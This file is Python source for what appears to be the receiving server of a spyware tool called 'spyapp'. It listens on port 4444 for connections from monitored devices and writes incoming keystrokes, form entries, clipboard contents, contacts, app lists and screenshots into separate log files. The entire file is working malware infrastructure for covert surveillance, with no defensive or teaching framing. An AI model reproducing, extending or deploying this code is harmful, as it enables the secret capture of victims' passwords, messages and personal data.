import socket
import os
from datetime import datetime

# Make log dir
LOG_DIR = "./spyapp_logs"
os.makedirs(LOG_DIR, exist_ok=True)

def log(tag, content):
    filename_map = {
        "[KEY]": "keylogger.txt",
        "[FORM]": "form_input.txt",
        "[CLIPBOARD]": "clipboard.txt",
        "[CONTACT]": "contacts.txt",
        "[APP]": "apps.txt",
        "[ERROR]": "errors.txt"
    }

    for prefix, fname in filename_map.items():
        if content.startswith(prefix):
            with open(os.path.join(LOG_DIR, fname), "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now()}] {content}\n")
            return

    with open(os.path.join(LOG_DIR, "misc.txt"), "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now()}] {content}\n")

def save_screenshot(binary):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOG_DIR, f"screenshot_{ts}.png")
    with open(path, "wb") as f:
        f.write(binary)
    print(f"[+] Screenshot saved to {path}")

def start_server(ip="0.0.0.0", port=4444):
    print(f"[+] Listening on {ip}:{port}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(5)

    while True:
        conn, addr = server.accept()
        print(f"[+] Connection from {addr}")
        try:
            data = conn.recv(8192)
            if data.startswith(b"[SCREENSHOT_BINARY]"):
                save_screenshot(data[len("[SCREENSHOT_BINARY]"):])
            else:
                msg = data.decode(errors="ignore").strip()
                print("[DATA]", msg)
                log(msg[:10], msg)
        except Exception as e:
            print("[!] Error:", str(e))
        finally:
            conn.close()

if __name__ == "__main__":
    start_server()
